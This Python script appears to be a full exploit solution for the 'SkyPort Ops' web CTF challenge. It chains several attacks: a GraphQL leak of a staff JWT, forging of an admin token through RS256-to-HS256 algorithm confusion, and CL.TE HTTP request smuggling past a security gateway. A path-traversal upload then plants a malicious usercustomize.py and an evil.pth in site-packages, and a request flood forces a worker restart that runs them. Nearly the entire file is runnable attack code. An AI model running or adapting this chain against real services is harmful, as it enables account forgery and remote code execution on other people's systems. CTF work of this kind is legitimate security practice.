#!/usr/bin/env python3
"""
SkyPort Ops - Full Exploit Chain
0xfun CTF Challenge

Chain: GraphQL Info Disclosure → JWT Algorithm Confusion → HTTP Smuggling →
       Path Traversal → usercustomize.py hijack → SUID binary execution
"""

import socket
import json
import base64
import hashlib
import hmac
import time
import sys
import requests
from cryptography.hazmat.primitives import serialization

HOST = "chall.0xfun.org"
PORT = 30516

if len(sys.argv) > 1 and sys.argv[1] == "LOCAL":
    HOST = "localhost"
    PORT = 8888

# ============================================================
# Step 1: GraphQL Information Disclosure - Leak Staff JWT
# ============================================================
def leak_jwt():
    print("[*] Step 1: Leaking staff JWT via GraphQL relay node...")
    s = requests.Session()

    # Query StaffNode:2 via relay global ID
    global_id = base64.b64encode(b"StaffNode:2").decode()
    query = json.dumps({
        "query": '{node(id:"' + global_id + '"){... on StaffNode{accessToken}}}'
    })

    resp = s.post(f"http://{HOST}:{PORT}/graphql",
                  headers={"Content-Type": "application/json"},
                  data=query, timeout=10)
    data = resp.json()
    print(f"    Response: {json.dumps(data)[:200]}")

    token = data["data"]["node"]["accessToken"]
    print(f"    JWT: {token[:50]}...")

    # Extract JWKS URI from JWT payload
    payload_b64 = token.split('.')[1]
    payload_b64 += '=' * (4 - len(payload_b64) % 4)
    jwt_payload = json.loads(base64.urlsafe_b64decode(payload_b64))
    jwks_path = jwt_payload["jwks_uri"]
    print(f"    JWKS path: {jwks_path}")

    # Fetch public key
    resp = s.get(f"http://{HOST}:{PORT}{jwks_path}", timeout=10)
    jwks_data = resp.json()
    pem_key = jwks_data["public_key"]
    print(f"    Got RSA public key ({len(pem_key)} bytes)")

    # Convert PEM to DER
    pub_key = serialization.load_pem_public_key(pem_key.encode())
    der_key = pub_key.public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )

    return token, der_key


# ============================================================
# Step 2: JWT Algorithm Confusion (RS256 → HS256)
# ============================================================
def forge_admin_jwt(der_key):
    print("[*] Step 2: Forging admin JWT (RS256 → HS256 confusion)...")

    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": "admin", "role": "admin"}

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b'=')
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).rstrip(b'=')

    message = header_b64 + b'.' + payload_b64
    signature = hmac.new(der_key, message, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=')

    admin_jwt = (message + b'.' + sig_b64).decode()
    print(f"    Admin JWT: {admin_jwt[:50]}...")
    return admin_jwt


# ============================================================
# Step 3: HTTP Smuggling + Path Traversal Upload
# ============================================================
def smuggle_upload(admin_jwt, filename, content):
    """Use CL.TE smuggling to POST to /internal/upload bypassing SecurityGateway"""

    # Build multipart body for the smuggled request
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    mp_body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()

    # Build the smuggled request (goes to backend as 2nd request)
    smuggled = (
        f"POST /internal/upload HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Authorization: Bearer {admin_jwt}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(mp_body)}\r\n"
        f"\r\n"
    ).encode() + mp_body

    # CL.TE: Content-Length for gateway, Transfer-Encoding: chunked for backend
    total_body = b"0\r\n\r\n" + smuggled

    outer_request = (
        f"POST /graphql HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(total_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    ).encode() + total_body

    # Warmup request to establish backend connection
    warmup = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"\r\n"
    ).encode()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5 if HOST != "localhost" else 1)
        sock.connect((HOST, PORT))

        # Warmup
        sock.sendall(warmup)
        time.sleep(0.5)
        sock.recv(4096)

        # Smuggle
        sock.sendall(outer_request)
        time.sleep(1)

        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()

        resp_str = response.decode('utf-8', errors='replace')
        if "uploaded successfully" in resp_str:
            print(f"    [+] Upload CONFIRMED: {filename}")
            return True
        else:
            first_line = resp_str.split('\r\n')[0] if resp_str else "(empty)"
            print(f"    [?] Response: {first_line[:100]}")
            return "200" in first_line or "uploaded" in resp_str.lower()
    except Exception as e:
        print(f"    [-] Error: {e}")
        return False


# ============================================================
# Step 4: Trigger Worker Restart
# ============================================================
def trigger_restart(num_requests=350):
    print(f"[*] Step 4: Sending {num_requests} requests to trigger --max-requests 100 worker restart...")
    s = requests.Session()
    success = 0
    for i in range(num_requests):
        try:
            r = s.get(f"http://{HOST}:{PORT}/", timeout=5)
            if r.status_code == 200:
                success += 1
        except:
            pass
        if (i + 1) % 50 == 0:
            print(f"    Sent {i+1}/{num_requests} ({success} ok)")
    print(f"    Done: {success}/{num_requests} successful")


# ============================================================
# Step 5: Check for Flag
# ============================================================
def check_flag():
    try:
        r = requests.get(f"http://{HOST}:{PORT}/uploads/FLAG.txt", timeout=5)
        if r.status_code == 200 and len(r.text.strip()) > 0:
            return r.text.strip()
    except:
        pass
    return None


# ============================================================
# Main Exploit
# ============================================================
def main():
    print("=" * 60)
    print("SkyPort Ops - Full Exploit")
    print("=" * 60)

    # Step 1: Leak JWT
    staff_jwt, der_key = leak_jwt()

    # Step 2: Forge admin JWT
    admin_jwt = forge_admin_jwt(der_key)

    # Step 3: Upload usercustomize.py via smuggling
    malicious_code = b"""import subprocess, os
try:
    result = subprocess.check_output(['/flag'], stderr=subprocess.STDOUT, timeout=5)
    with open('/tmp/skyport_uploads/FLAG.txt', 'w') as f:
        f.write(result.decode())
except Exception as e:
    with open('/tmp/skyport_uploads/ERROR.txt', 'w') as f:
        f.write(str(e))
"""

    target_path = "/home/skyport/.local/lib/python3.11/site-packages/usercustomize.py"
    pth_path = "/home/skyport/.local/lib/python3.11/site-packages/evil.pth"
    pth_content = b"import os; os.system('/flag > /tmp/skyport_uploads/FLAG.txt 2>&1')\n"

    print(f"\n[*] Uploading usercustomize.py to {target_path}")
    for attempt in range(15):
        print(f"    Attempt {attempt + 1}/15...")
        if smuggle_upload(admin_jwt, target_path, malicious_code):
            break
        time.sleep(0.5)

    print(f"\n[*] Also uploading .pth file as backup to {pth_path}")
    for attempt in range(10):
        print(f"    Attempt {attempt + 1}/10...")
        smuggle_upload(admin_jwt, pth_path, pth_content)
        time.sleep(0.5)

    # Step 4: Trigger worker restart
    print()
    trigger_restart(350)

    # Step 5: Check for flag
    print("\n[*] Step 5: Checking for flag...")
    flag = None
    for i in range(15):
        flag = check_flag()
        if flag:
            print(f"    [+] FLAG CAPTURED: {flag}")
            break
        print(f"    Retry {i+1}/15 in 3s...")
        time.sleep(3)

    if flag:
        print("\n" + "=" * 60)
        print(f"FLAG: {flag}")
        print("=" * 60)
        with open("/root/ctf/oxfun/web/skyport_ops/flag.txt", "w") as f:
            f.write(flag + "\n")
    else:
        print("\n[-] Flag not captured. Checking error...")
        try:
            r = requests.get(f"http://{HOST}:{PORT}/uploads/ERROR.txt", timeout=5)
            if r.status_code == 200:
                print(f"    Error: {r.text}")
        except:
            pass


if __name__ == "__main__":
    main()
